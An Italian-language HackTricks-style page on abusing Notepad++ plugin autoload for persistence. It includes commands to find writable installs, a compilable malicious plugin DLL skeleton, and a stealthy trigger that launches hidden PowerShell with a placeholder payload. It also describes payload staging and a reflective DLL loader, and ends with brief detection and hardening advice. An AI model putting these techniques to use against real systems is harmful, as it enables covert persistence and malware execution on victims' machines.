# Persistenza ed esecuzione tramite autoload di plugin di Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ farà **autoload di ogni plugin DLL trovato nelle sue sottocartelle `plugins`** all'avvio. Depositare un plugin malevolo in qualsiasi **installazione di Notepad++ scrivibile** dà esecuzione di codice dentro `notepad++.exe` ogni volta che l'editor si avvia, cosa che può essere abusata per **persistence**, **initial execution** stealth, o come **in-process loader** se l'editor viene avviato con privilegi elevati.

Da **Notepad++ 7.6+** il layout atteso per l'installazione manuale è **una sottocartella per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presenza di `doLocalConf.xml` accanto a `notepad++.exe`), l'intero albero dell'applicazione resta locale in quella directory, cosa che spesso trasforma bundle copiati/tool admin in una facile superficie di esecuzione scrivibile dall'utente.

## Posizioni scrivibili dei plugin
- Installazione standard: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (di solito richiede admin per scrivere).
- Opzioni scrivibili per operatori con privilegi bassi:
- Usa la **portable Notepad++ build** in una cartella scrivibile dall'utente.
- Copia `C:\Program Files\Notepad++` in un percorso controllato dall'utente (ad es. `%LOCALAPPDATA%\npp\`) ed esegui `notepad++.exe` da lì.
- Cerca **admin tool bundles**, copie zip estratte, o help-desk toolkits che già contengono `doLocalConf.xml` e vivono fuori da `Program Files`.
- Ogni plugin ottiene la propria sottocartella sotto `plugins` ed è caricato automaticamente all'avvio; le voci di menu appaiono sotto **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Pointi di caricamento del plugin (execution primitives)
Notepad++ si aspetta specifiche funzioni **esportate**. Tutte queste vengono chiamate durante l’inizializzazione, offrendo più superfici di esecuzione:
- **`DllMain`** — viene eseguito immediatamente al caricamento della DLL (primo punto di esecuzione).
- **`setInfo(NppData)`** — chiamato una volta al load per fornire i handle di Notepad++; punto tipico per registrare voci di menu.
- **`getName()`** — restituisce il nome del plugin mostrato nel menu.
- **`getFuncsArray(int *nbF)`** — restituisce i comandi del menu; anche se vuoto, viene chiamato durante lo startup.
- **`beNotified(SCNotification*)`** — riceve eventi di Notepad++ / Scintilla (utile per posticipare i payload fino a un’azione dell’utente o a un evento dell’editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — gestore di messaggi, utile per scambi di dati più grandi.
- **`isUnicode()`** — flag di compatibilità controllato al load.

La maggior parte delle export può essere implementata come **stub**; l’esecuzione può avvenire da `DllMain` o da qualsiasi callback sopra durante l’autoload.

## Minimal malicious plugin skeleton
Compila una DLL con le export attese e inseriscila in `plugins\\MyNewPlugin\\MyNewPlugin.dll` sotto una cartella di Notepad++ scrivibile:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compila la DLL (Visual Studio/MinGW).
2. Crea la sottocartella del plugin sotto `plugins` e inserisci la DLL al suo interno.
3. Riavvia Notepad++; la DLL viene caricata automaticamente, eseguendo `DllMain` e le callback successive.

## Pattern di trigger a basso rumore tramite `beNotified`
Per OPSEC, molti payload **non** dovrebbero attivarsi da `DllMain`. Un pattern più discreto è lasciare che il plugin si carichi correttamente, poi eseguire solo dopo un evento realistico dell'editor come **startup complete**, **buffer activation** o il **primo carattere digitato**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Questo si allinea meglio alla ricerca offensiva pubblica rispetto a un rumoroso beacon `DllMain`: la DLL viene ancora autocaricata all'avvio, ma l'azione malevola viene ritardata finché Notepad++ sembra essere davvero in uso.

## Using the plugin config directory as secondary storage
Notepad++ espone `NPPM_GETPLUGINSCONFIGDIR`, che restituisce la **directory di configurazione dei plugin dell'utente corrente**. Un plugin malevolo può usarla per mantenere minima la DLL su disco, mentre memorizza config cifrata, payload staged o file di tasking in un percorso che si confonde con il normale stato del plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operativamente questo è utile quando vuoi:
- un piccolo bootstrap DLL autoloaded;
- tasking per-user senza toccare di nuovo il binary principale del plugin;
- separare il **autoload trigger** dalla seconda stage più pesante.

## Reflective loader plugin pattern
Un plugin weaponized può trasformare Notepad++ in un **reflective DLL loader**:
- Presentare una UI/menu entry minimale (ad es. "LoadDLL").
- Accettare un **file path** o un **URL** da cui recuperare un payload DLL.
- Mappare reflectively la DLL nel processo corrente e invocare un entry point esportato (ad es. una funzione loader all’interno della DLL recuperata).
- Vantaggio: riutilizzare un processo GUI dall’aspetto benigno invece di avviare un nuovo loader; il payload eredita l’integrità di `notepad++.exe` (inclusi i contesti elevati).
- Trade-off: lasciare cadere su disco un **unsigned plugin DLL** è rumoroso; una variazione pratica è usare il plugin autoloaded solo come stub e mantenere il vero implant encrypted/staged altrove.

## Detection and hardening notes
- Bloccare o monitorare le **writes to Notepad++ plugin directories** (incluse le copie portable nei profili utente); abilitare controlled folder access o application allowlisting.
- Generare alert su **new unsigned DLLs** sotto `plugins`, modifiche agli alberi di Notepad++ portable e insolite **child processes/network activity** da `notepad++.exe`.
- Stabilire una baseline dei plugin legittimi e indagare qualsiasi nuova DLL che esporti la normale interfaccia plugin di Notepad++ ma che avvii anche shell, PowerShell o network beacon.
- Imporre l’installazione dei plugin solo tramite **Plugins Admin**, e limitare l’esecuzione delle copie portable da path non trusted.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
